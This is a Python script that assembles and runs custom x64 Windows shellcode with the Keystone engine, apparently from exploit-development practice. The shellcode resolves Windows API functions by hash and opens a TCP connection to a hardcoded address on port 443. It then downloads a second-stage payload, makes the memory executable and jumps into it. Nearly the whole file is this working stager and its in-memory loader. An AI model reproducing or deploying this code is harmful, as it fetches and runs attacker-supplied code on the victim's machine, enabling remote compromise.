import ctypes, struct
import binascii
import os
import subprocess
from keystone import *

def main():
    SHELLCODE = (
        " start:                            "
        "   int3                            ;"
        "   mov rbp, rsp                    ;"
        "   add rsp, 0xffffffffffffffe0     ;"  # Allocate stack
        
        " find_kernel32:                    "   # start to find kernel32 library
        "   xor rcx, rcx                    ;"  # Zero RCX contents
        "   mov rsi, gs:[rcx+0x60]          ;"  # 0x060 load PEB to RAX
        "   mov rsi, [rsi+0x18]             ;"  # 0x18 load PEB.Ldr Offset
        "   mov rsi, [rsi+0x20]             ;"  # 0x20 Offset = PEB.Ldr.InMemoryOrderModuleList
        
        " next_module:                      "
        "   mov rbx, [rsi+0x20]             ;"  # DllBase, InMem + 0x30 - 0x10
        "   mov rdi, [rsi+0x50]             ;"  # ModName, InMem + 0x58 - 0x10 + 0x8 (Buffer)
        "   mov rsi, [rsi]                  ;"  # RSI = InMem.Flink (next module)
        "   cmp [rdi+0xc*2], cx             ;"  # KERNEL32.DLL is 12 bytes long, if 25th position of UNICODE is NULL, bingo
        "   jne next_module                 ;"  # If not, keep looking
        
        " check_kernel32:                   "
        "   mov cl, 0x6c                    ;"  # Lowercase 'l'
        "   mov dl, [rdi+0xb*2]             ;"  # Move second last char to DL
        "   sub dl, 0x41                    ;"  # current char - hex(ord('A'))
        "   add dl, 0x61                    ;"  # above result + hex(ord('a')) = lowercase char
        "   cmp dl, cl                      ;"  # Check if current char is 'l' (0x6c), address the problem when the 'exe' name is 12 characters long, being really LAZY here!
        "   jne next_module                 ;"  # If the character before NULL is not 'l', then we found a module which has a name of 12 chars but not a dll, keep looking
         
        " get_find_function_ret:            "
        "   jmp find_function_short         ;"  # A short jump to call function backwards
        
        " find_function_ret:                 "
        "   pop rsi                         ;"  # Pop ret addr of find_function to RSI
        "   mov [rbp+0x8], rsi              ;"  # Save ret addr of find_function to [rbp+0x8] for later use
        "   jmp resolve_functions_knl32     ;"  # Resolve functions
        
        " find_function_short:               "
        "   call find_function_ret          ;"  # This will push the ret addr of find_function on stack, we will save that for later use
               
        # Resolving VA for Export Address Table
        " find_function:                    "
        "   mov eax, dword ptr [rbx+0x3C]   ;"  # dll->e_lfanew
        "   mov edi, dword ptr [rbx+rax+0x88];"  # RDI = Export Directory RVA (0x78 + 0x10) NULL Byte
        "   add rdi, rbx                    ;"  # RDI = Export Directory VA
        "   xor rcx, rcx                    ;"  # Clear RCX TODO: no need?
        "   mov ecx, dword ptr [rdi+0x18]   ;"  # RCX = NumberOfNames
        "   xor rax, rax                    ;"  # Clear RAX TODO: no need?
        "   mov eax, dword ptr [rdi+0x20]   ;"  # RAX = AddressOfNames RVA
        "   add rax, rbx                    ;"  # RAX = AddressOfNames VA
        "   mov [rbp+0x10], rax             ;"  # Save AddressOfNames VA to [rbp+0x10]
        
        # Resolve specific function from Kerner32.dll
        " find_function_loop:               "
        "   jecxz function_found            ;"  # RCX = 0, loop over
        "   dec rcx                         ;"  # Decrese RCX counter
        "   mov rax, [rbp+0x10]             ;"  # Restore AddressOfNames VA
        "   mov esi, dword ptr [rax+rcx*4]  ;"  # ESI = RVA of function name
        "   add rsi, rbx                    ;"  # RSI = VA of function name
        
        " compute_hash:                     "
        "   xor rax, rax                    ;"  # Clear RAX
        "   cqo                             ;"  # Clear RDX
        "   cld                             ;"  # Clear direction
        
        " compute_hash_again:               "
        "   lodsb                           ;"  # Load byte at RSI into AL
        "   test al, al                     ;"  # Check for NULL terminator
        "   jz compute_hash_done            ;"  # Finish hashing when ZF is set
        "   ror edx, 0x0d                   ;"  # Rotate RDX 13 bits to the right
        "   add edx, eax                    ;"  # Add new bytes to RDX
        "   jmp compute_hash_again         ;"  # Compute hash for next byte
        
        " compute_hash_done:                "
        
        " find_function_compare:            "
        "   cmp edx, r15d                   ;"  # Compare computed hash with target hash
        "   jnz find_function_loop          ;"  # If not match, loop to next
        "   mov edx, dword ptr [rdi+0x24]   ;"  # EDX = AddressOfNameOrdinals RVA
        "   add rdx, rbx                    ;"  # RDX = AddressOfNameOrdinals VA
        "   mov cx, word ptr [rdx+rcx*2]    ;"  # ECX = Function's Ordinal
        "   mov edx, dword ptr [rdi+0x1c]   ;"  # EDX = AddressOfFunctions RVA
        "   add rdx, rbx                    ;"  # RDX = AddressOfFunctions VA
        "   mov eax, dword ptr [rdx+rcx*4]  ;"  # EAX = Function RVA
        "   add rax, rbx                    ;"  # RAX = Function VA; Save Function VA to RAX

        " function_found:                   "
        "   ret                             ;"
        
        " resolve_functions_knl32:              "
        "   mov r15, 0x78b5b983             ;"  # TerminateProcess hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x18], rax             ;"  # Save TerminateProcess to [rbp+0x18]
        "   mov r15, 0xec0e4e8e             ;"  # LoadLibraryA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x20], rax             ;"  # Save LoadLibraryA to [rbp+0x20]
        "   mov r15, 0x4c0297fa             ;"  # LocalAlloc hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x28], rax             ;"  # Save LocalAlloc to [rbp+0x28]
        "   mov r15, 0x7946c61b             ;"  # VirtualProtect hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x30], rax             ;"  # Save VirtualProtect to [rbp+0x30]
           
        " dummy_1:                          "  # stage 1 and 2 separator 0x90 * 10
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"

        " load_ws2_32:                      "
        "   xor rax, rax                    ;"  # Clear RAX for ws2_32.dll\0 string
        "   mov ax, 0x6c6c                  ;"  # RAX = \0ll
        "   push rax                        ;"  # Stack = \0ll
        "   mov rax, 0x642e32335f327377     ;"  # RAX = d.23_2sw
        "   push rax                        ;"  # Stack = \0lld.23_2sw
        "   mov rcx, rsp                    ;"  # Argument pointer to LoadLibraryA
        "   add rsp, 0xffffffffffffffa0     ;"  # Stack space & home space
        "   call qword ptr [rbp+0x20]       ;"  # Call LoadLibraryA
        "   mov rbx, rax                    ;"  # Save base address of ws2_32.dll to RBX
        "   add rsp, 0x60                   ;"  # Cleanup
        
        " resolve_functions_ws2_32:         "
        "   mov r15, 0x3bfcedcb             ;"  # WSAStartup hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x38], rax             ;"  # Save WSAStartup to [rbp+0x38]
        "   mov r15, 0xadf509d9             ;"  # WSASocketA hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x40], rax             ;"  # Save WSASocketA to [rbp+0x40]
        "   mov r15, 0xb32dba0c             ;"  # WSAConnect hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x48], rax             ;"  # Save WSAConnect to [rbp+0x48]
        "   mov r15, 0xe71819b6             ;"  # recv hash
        "   call qword ptr [rbp+0x08]       ;"  # Call find_function
        "   mov [rbp+0x50], rax             ;"  # Save recv to [rbp+0x50]
        
        " dummy_2:                          "  # stage 2 and 3 separator 0x90 * 10
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        "   nop                             ;"
        
        " call_wsastartup:                  "
        "   add rsp, 0xfffffffffffffdf8     ;"  # Allocate stack space, for lpWSAData structure, second argument (note the 8 is for stack alignment because lpWSAData is only 8 bytes)
        "   mov cx, 0x202                   ;"  # First argument, wVersionRequired
        "   mov rdx, rsp                    ;"  # Move ESP to RDX, space for lpWSAData
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x38]       ;"  # Call WSAStartup
        "   test al, al                     ;"  # Check return
        "   jnz call_terminate_process      ;"  # If not zero, terminate process
        "   add rsp, 0x228                  ;"  # Cleanup
             
        " call_wsasocketa:                  "
        "   add rsp, 0xfffffffffffffdf8     ;"  # Allocate stack space
        "   xor rcx, rcx                    ;"  # Clear RCX
        "   xor rdx, rdx                    ;"  # Clear RDX
        "   mov cl, 0x2                     ;"  # First arg, af, 0x2
        "   mov dl, 0x1                     ;"  # Second arg, type, 0x1
        "   mov r8, 0x6                     ;"  # Third arg, protocol, IPPROTO_TCP 0x6
        "   xor r9, r9                      ;"  # Fourth arg, lpProtocolInfo, 0x0
        "   push r9                         ;"  # Sixth arg, dwFlags, 0x0
        "   push r9                         ;"  # Fifth arg, g, 0x0
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x40]       ;"  # Call WSASocketA
        "   cmp ax, 0xffff                  ;"  # Check return
        "   je call_terminate_process       ;"
        "   mov [rbp+0x58], rax             ;"  # Save socket handle to [rbp+0x58]
        "   add rsp, 0x228                  ;"  # Cleanup
        
        " call_wsaconnect:                  "
        "   add rsp, 0xffffffffffffff00     ;"  # Allocate stack space for sockaddr_in struct
        "   mov rcx, [rbp+0x58]             ;"  # First arg, s
        "   xor rax, rax                    ;"  # Clear RAX, contruct sockaddr_in struct
        "   mov rax, 0x1403a8c0bb010002     ;"  # sin_addr (4 bytes), sin_port (443 2 bytes), sin_family (AF_INET 2 bytes)
        "   push rax                        ;"  # Push sin_addr, sin_port & sin_family
        "   push rsp                        ;"  # Push pointer to structaddr_in struct
        "   pop rdx                         ;"  # Second arg, name
        "   mov r8, 0x10                    ;"  # Third arg, namelen (4 + 2 + 2 + char sin_zero[8])
        "   xor r9, r9                      ;"  # Fourth argc, lpCallerData
        "   push r9                         ;"  # Seventh arg, lpGQOS
        "   push r9                         ;"  # Sixth arg, lpGQOS
        "   push r9                         ;"  # Fifth arg, lpCalleeData
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x48]       ;"  # Call WSAConnect
        "   test al, al                     ;"  # Check return
        "   jnz call_terminate_process      ;"  # If not zero, terminate process
        "   add rsp, 0x120                  ;"  # Cleanup
        
        " prep_call_recv:                   ;"  # Prepare arguments to call recv, so call_recv can be resued
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   mov rbx, rsp                    ;"  # Second arg, buf
        "   xor r12, r12                    ;"  # Clear R12
        "   add r12, 0x4                    ;"  # Third arg, len
        "   xor r13, r13                    ;"  # Clear R10, this serves as the return value of recv
        "   mov r13, r12                    ;"  # Set R13 to 0x4, the len
        "   xor rsi, rsi                    ;"  # Clear RSI, RSI serves as flag indicating we are recving all stage 2 payload or just the size value, 0 we are recving the size value, 1, we are recving the rest of stage 2 payload

        " call_recv:                        "   # Call recv to fetch stage 2 payload length   
        "   mov rcx, [rbp+0x58]             ;"  # First argument, SOCKET s
        "   mov rdx, rbx                    ;"  # Second arg, buf
        "   mov r8, r12                     ;"  # Third arg, len
        "   xor r9, r9                      ;"  # Fourth arg, flag, 0x0
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x50]       ;"  # Call recv
        "   test rsi, rsi                   ;"  # Check if we are recving second stage paylaod
        "   jnz do_loop                     ;"  # If yes, jump to the loop to recv stage 2 payload
        
        " save_stage_2_size:                ;"
        "   cmp rax, r13                    ;"  # Check if return value is the length we specified
        "   jne call_terminate_process      ;"  # If not, terminate process
        "   mov r14, [rsp+0x20]             ;"  # Move stage 2 size to R14
        "   mov [rbp+0x60], r14             ;"  # Save stage 2 size to [rbp+0x60]
        "   add rsp, 0xa0                   ;"  # Cleanup
        
        " call_localalloc:                  "   # Call LocalAlloc to allocate buffer for stage 2
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   mov rcx, 0x40                   ;"  # First arg, uFlags, 0x40, LPTR
        "   xor rdx, rdx                    ;"  # Clear rdx
        "   mov edx, r14d                   ;"  # Second arg, uBytes, what's saved in R14d
        "   add edx, 0x10                   ;"  # Compensate for additional "mov edx, ..." instruction
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x28]       ;"  # Call LocalAlloc
        "   test al, al                     ;"  # Check return
        "   jz call_terminate_process       ;"  # If NULL, terminate process 
        "   mov [rbp+0x68], rax             ;"  # Save handle to buffer to [rbp+0x68]
        "   add rsp, 0xa0                   ;"  # Cleanup
        
        " prep_stage_2:                     "   # Phasing into stage 2
        "   xor ecx, ecx                    ;"
        "   mov ecx, 0xbd41                 ;"  # mov r13d, socket; xor rdi, rdi; mov edi, r13d; break \xbf signature
        "   mov [rax], ecx                  ;"
        "   mov ecx, [rbp+0x58]             ;"  # Move SOCKET handle to ECX
        "   mov [rax+0x2], ecx              ;"  # Move SOCKET handle to [rax+0x4]
        "   mov rcx, 0xef8944ff3148         ;"  # Rest of the opcode
        "   mov [rax+0x6], rcx              ;"  # Move rest of the opcode to position
        
        " loop_recv:                        "   # Loop recv call, get the rest of stage 2
        "   add rsp, 0xffffffffffffff60     ;"  # Allocate stack space (home space included)
        "   xor rax, rax                    ;"  # Clear RAX, RAX serves as the current bytes received
        "   xor rdi, rdi                    ;"  # Clear RDI, this serves as condition to loop (< stage 2 size)
        "   mov rbx, [rbp+0x68]             ;"  # RBX serves as temprary address for the buffer
        "   add rbx, 0xc                    ;"  # Skip the first 12 bytes in the buffer
        "   mov r13, 0xffffffffffffffff     ;"  # Move -1 to R10, SOCKET_ERROR
        "   inc rsi                         ;"  # Set RSI to 1, indicating we are recving the whole stage 2 payload
        
        " do_loop:                          "   # Loop the loop
        "   cmp rax, r13                    ;"  # Check if return value SOCKET_ERROR
        "   je call_terminate_process       ;"  # If yes, terminate process
        "   add rsp, 0x20                   ;"  # Cleanup home space
        "   add rbx, rax                    ;"  # Add current received bytes to buffer, so the rest of payload will be appended to correct address
        "   add rdi, rax                    ;"  # Add current received bytes to RDI (total received bytes), it will be compared to R14 (stage 2 size), to determine if we have to end the loop
        "   mov r12, [rbp+0x60]             ;"  # Move stage 2 size to R12
        "   sub r12, rdi                    ;"  # Subtract current total received bytes from stage 2 size
        "   cmp rdi, [rbp+0x60]             ;"  # Compare received bytes to stage 2 size
        "   jl  call_recv                   ;"  # If received bytes < stage 2 size, keep recv data

        " recv_end:                         ;"  # Have received all stage 2 payload
        "   add rsp, 0x80                   ;"  # Cleanup
        
        " call_virtual_protect:             "   # Change mem protection to RX
        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
        "   mov rcx, [rbp+0x68]             ;"  # First arg, lpAddress
        "   mov rdx, r14                    ;"  # Second arg, dwSize
        "   add rdx, 0x10                   ;"  # Extra bytes
        "   mov r8, 0x40                    ;"  # Third arg, flNewProtect, PAGE_EXECUTE_READWRITE, RX will fail because the stager will write to mem space, so, RWX is a must
        "   mov r9, rsp                     ;"
        "   sub r9, 0x10                    ;"  # Fourth arg, lpflOldProtect
        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
        "   call qword ptr [rbp+0x30]       ;"  # Call VirtualProtect
        "   test al, al                     ;"  # Check return
        "   jz call_terminate_process       ;"  # If zero, terminate process
        "   add rsp, 0xa0                   ;"  # Cleanup

        " execute:                          "   # Jump to our buffer and execute stage 2
        "   mov rax, [rbp+0x68]             ;"  # Move handle to stage 2 buffer to rax
        "   jmp rax                         ;"  # Jmp to rax
        
        " call_terminate_process:            "
        "   mov rcx, 0xffffffffffffffff     ;"  # -1, Current process
        "   xor rdx, rdx                    ;"  # NULL
        "   call qword ptr [rbp+0x18]       ;"  # Call TerminateProcess
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: "  + output )
    print("Bytes: " + str(len(sh)))
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
